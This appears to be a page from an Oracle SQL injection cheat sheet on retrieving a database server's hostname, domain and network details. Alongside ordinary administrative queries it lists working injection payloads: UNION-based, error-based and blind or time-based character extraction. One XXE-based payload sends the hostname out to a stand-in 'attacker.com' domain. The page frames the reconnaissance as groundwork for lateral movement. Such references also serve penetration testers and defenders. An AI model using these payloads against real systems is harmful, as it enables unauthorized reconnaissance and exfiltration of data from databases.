---
title: Server Hostname
description: Techniques to retrieve the Oracle database server hostname information
category: Information Gathering
order: 6
tags: ["hostname", "enumeration", "system information"]
lastUpdated: 2025-03-15
---

## Server Hostname

Determining the hostname of an Oracle database server can provide valuable information about the network infrastructure and assist in mapping the target environment. This information is often useful for lateral movement in more complex environments.

### Basic Hostname Queries

Oracle provides several system views and functions to obtain hostname information:

| Method | Description | Example Output |
|--------|-------------|----------------|
| `SYS_CONTEXT('USERENV', 'SERVER_HOST')` | Current server hostname | oracle-prod-db01 |
| `UTL_INADDR.GET_HOST_NAME` | Local hostname via UTL_INADDR package | oracle-prod-db01.example.com |
| `v$instance.HOST_NAME` | Instance hostname from v$instance view | oracle-prod-db01 |
| `sys.GV_$INSTANCE` | Host information in RAC environments | Multiple hostnames in cluster |

### Standard Hostname Queries

```sql
-- Most common method
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST') FROM dual

-- From v$instance view
SELECT HOST_NAME FROM v$instance

-- Full instance information
SELECT INSTANCE_NAME, HOST_NAME, STATUS, DATABASE_STATUS FROM v$instance
```

### SQL Injection Examples

#### UNION-Based Hostname Extraction

```sql
-- Basic UNION attack
' UNION SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST'),NULL FROM dual--

-- Multi-column output
' UNION SELECT NULL,HOST_NAME,NULL,NULL FROM v$instance--
```

#### Error-Based Hostname Extraction

```sql
-- Using error messages to extract hostname
' AND CTXSYS.DRITHSX.SN(1,(SELECT HOST_NAME FROM v$instance))=1--

-- Alternative error-based method
' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT HOST_NAME FROM v$instance)||'.attacker.com/"> %remote;]>'),'/l') FROM dual) IS NOT NULL--
```

#### Blind Hostname Extraction

For blind SQL injection scenarios, character-by-character extraction:

```sql
-- Check if first character of hostname is 'o'
' AND ASCII(SUBSTR((SELECT HOST_NAME FROM v$instance),1,1))=111--
```

For time-based blind:

```sql
-- Add delay if first character is 'o'
' AND (CASE WHEN ASCII(SUBSTR((SELECT HOST_NAME FROM v$instance),1,1))=111 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### Domain Information

In addition to hostname, you can also extract domain information:

```sql
-- Get domain name
SELECT SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual

-- Combined hostname and domain
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST')||'.'||SYS_CONTEXT('USERENV', 'DB_DOMAIN') FROM dual
```

### Network Interface Information

Oracle can also reveal information about network interfaces:

```sql
-- Get all network interfaces (requires privileges)
SELECT HOST_NAME, IP_ADDRESS FROM v$instance_ip_listener

-- Get network service information
SELECT HOST, PORT, STATUS FROM v$listener_network
```

### Environment Details

For more comprehensive environment information:

```sql
-- Get various environment details
SELECT SYS_CONTEXT('USERENV', 'SERVER_HOST') as hostname,
       SYS_CONTEXT('USERENV', 'DB_NAME') as database_name,
       SYS_CONTEXT('USERENV', 'INSTANCE_NAME') as instance_name,
       SYS_CONTEXT('USERENV', 'IP_ADDRESS') as ip_address
FROM dual
```

### Using UTL_INADDR Package

The UTL_INADDR package can provide network resolution capabilities:

```sql
-- Get hostname using UTL_INADDR (requires execute permission)
SELECT UTL_INADDR.GET_HOST_NAME FROM dual

-- Get IP address from hostname
SELECT UTL_INADDR.GET_HOST_ADDRESS('internal-hostname') FROM dual
```

### Global Database Name

The global database name combines the database name with the domain:

```sql
-- Get global database name
SELECT GLOBAL_NAME FROM GLOBAL_NAME
```

